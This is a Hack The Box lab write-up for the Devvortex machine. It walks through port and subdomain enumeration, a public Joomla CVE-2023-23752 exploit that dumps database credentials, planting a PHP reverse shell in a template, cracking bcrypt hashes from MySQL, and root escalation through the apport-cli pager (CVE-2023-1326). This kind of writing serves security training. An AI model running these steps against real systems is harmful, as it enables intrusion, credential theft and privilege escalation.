# HTB - Devvortex

### TL;DR
This is an Ubuntu machine running a web server created with a vulnerable version of the Joomla CMS. Using a github exploit we dump admin credentials for Joomla, which allows us to upload a PHP reverse shell. Once inside the box we find a local user blowfish hash in a local mysql database, which once cracked can be used for SSH access. For root, we abuse a vulnerable version of the `apport-cli` tool which the local user can run with `sudo`.

**Keywords:**<br>
Joomla, blowfish, apport-cli

**References:**<br>
https://github.com/Acceis/exploit-CVE-2023-23752<br>
https://www.cvedetails.com/cve/CVE-2023-1326<br>
https://www.cvedetails.com/cve/CVE-2023-23752<br>
https://stackoverflow.com/questions/6152232/how-to-generate-core-dump-file-in-ubuntu<br>
https://stackoverflow.com/questions/17965/how-to-generate-a-core-dump-in-linux-on-a-segmentation-fault<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason

nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-25 15:51 EST
Nmap scan report for 10.129.73.111
Host is up, received user-set (0.089s latency).
Not shown: 63037 closed tcp ports (conn-refused), 2496 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 29.68 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-25 15:52 EST
Nmap scan report for 10.129.73.111
Host is up, received user-set (0.12s latency).
Scanned at 2023-11-25 15:52:24 EST for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
```
Next step is to discover hidden subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 154 -t 100 -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 143ms]
:: Progress: [4989/4989] :: Job [1/1] :: 866 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
Fuzz again in the `.dev` subdomain.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 --fc 404 -u http://dev.devvortex.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 84ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 427ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 129ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 3081ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 110ms]
index.php               [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 3165ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 152ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 119ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 97ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 67ms]
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 64ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 80ms]
robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 113ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 136ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 110ms]
:: Progress: [4713/4713] :: Job [1/1] :: 32 req/sec :: Duration: [0:02:16] :: Errors: 0 ::
```
Browsing the `robots.txt` file we find out there is an administrator login portal.

![devvortex1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c428baa2-74ff-4c97-8e45-1f5531432aa5)

There seems to be a Joomla CMS installed, we can enumerate the version in the README file.

![devvortex2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f685c87a-abc7-4d82-87cd-5fae41577404)

It seems the Joomla version isntalled is version 4.2.
### PHASE 2: User
Looking for exploits for Joomla 4.2, we came across this one https://github.com/Acceis/exploit-CVE-2023-23752<br>
Download it and install the necessary dependiencies.
```markdown
> sudo gem install httpx docopt paint

Fetching httpx-1.1.5.gem
Fetching http-2-next-1.0.1.gem
Successfully installed http-2-next-1.0.1
Successfully installed httpx-1.1.5
Parsing documentation for http-2-next-1.0.1
Installing ri documentation for http-2-next-1.0.1
Parsing documentation for httpx-1.1.5
Installing ri documentation for httpx-1.1.5
Done installing documentation for http-2-next, httpx after 6 seconds
Fetching docopt-0.6.1.gem
Successfully installed docopt-0.6.1
Parsing documentation for docopt-0.6.1
Installing ri documentation for docopt-0.6.1
Done installing documentation for docopt after 0 seconds
Fetching paint-2.3.0.gem
Successfully installed paint-2.3.0
Parsing documentation for paint-2.3.0
Installing ri documentation for paint-2.3.0
Done installing documentation for paint after 0 seconds
4 gems installed
```
Now we can run the exploit to dump credentials for superuser in the administrator portal.
```markdown
> ruby ./exploit.rb http://dev.devvortex.htb

Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```
We use disclosed credentials to login into the administrator portal on http://dev.devvortex.htb/administrator/index.php<br>
Once inside, navigate to system &rarr; site templates.

![devvortex3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/91bf785a-72c7-4127-9a75-bd824f5728d1)

Select the "Cassiopeia" template and find a writable `.php` file (the `error.php` file is writable). Overwrite `error.php` contents with a php reverse shell.

![devvortex4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f92444db-bfeb-4f5b-b55a-49cb46c43671)

Save and close, the reverse shell is accessible on http://dev.devvortex.htb/templates/cassiopeia/error.php<br>
Once the reverse shell is received, first step is to upgrade the shell to a tty, then enumerate users who have a configured shell in the `/etc/passwd` file.
```markdown
> cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```
So our next goal will be to move laterally to user logan. Move to the webroot directory and look for interesting files. In the directory `/var/www/dev.devvortex.htb` you find a configuration php file which contains mysql credentials.
```markdown
> cat configuration.php

<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Development';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
        public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
```
This file contains credentials for user lewis in a mysql database. In fact, there is a local mysql server running internally on port 3306 which can be discovered with `netstat`.
Connect to it using lewis' credentials.
```markdown
> mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##
```
Navigate through the database, and dump hashes in the `sd4fg_users` table in the `joomla` database.
```markdown
> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```
logan's hash is blowfish type and can be cracked with `hashcat`
```markdown
> hashcat -m 3200 -a 0 -d 1 hash.txt .\rockyou.txt
```

![devvortex5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/ebb1b687-abf2-436f-b4d3-6656d2e8cc1e)

From the reverse shell you can `su logan` with cracked credentials and get user flag.
### PHASE 3. System
Begin starting an `ssh` shell for user logan.
```markdown
> ssh logan@devvortex.htb
```
Verify if logan is a sudoer.
```markdown
> sudo -l

[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
Turns out logan can execute application `apport-cli` as root. Investigating this application, we find out it is used to inspect crash dump files.
Looking for vulnerabilities, you can find this https://www.cvedetails.com/cve/CVE-2023-1326<br>
It seems versions earlier than 2.26 use `less` as pager, and this can be exploited for privilege escalation if run under root, which is the case for user logan.
Check which version of `apport-cli` is running.
```markdown
> sudo /usr/bin/apport-cli -v

2.20.11
```
So it seems version installed is vulnerable. We just need run a `.crash` file long enough so the binary calls the pager when parsing it.
Investigating ways to generate a crash in Ubuntu, we find 2 resources:
https://stackoverflow.com/questions/6152232/how-to-generate-core-dump-file-in-ubuntu<br>
https://stackoverflow.com/questions/17965/how-to-generate-a-core-dump-in-linux-on-a-segmentation-fault<br>
Following the instructions, let's first configure bash to save large dumps.
```markdown
> ulimit -c unlimited
```
Then force a segmentation fault, the core will be dumped as a crash file.
```markdown
> sleep 10 &

> killall -SIGSEGV sleep
```
If everything went well (wrong, in fact), a message indicating the core dumped is shown, and a crash file should have been saved in the `/var/crash` directory.

![devvortex6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/5d303061-e766-485f-85fb-e0a22ab5c669)

Launch the `apport-cli` tool with the generated dump file, the `less` pager will be called to display contents.
```markdown
> sudo /usr/bin/apport-cli --crash-file=/var/crash/_usr_bin_sleep.1000.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
```
Just enter `!sh` to interrupt the pager and make it open a shell. the spawned shell will be root shell since `apport-cli` was run with `sudo`.

![devvortex7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8e3a412b-2f43-4c9f-939e-b65b044466a5)












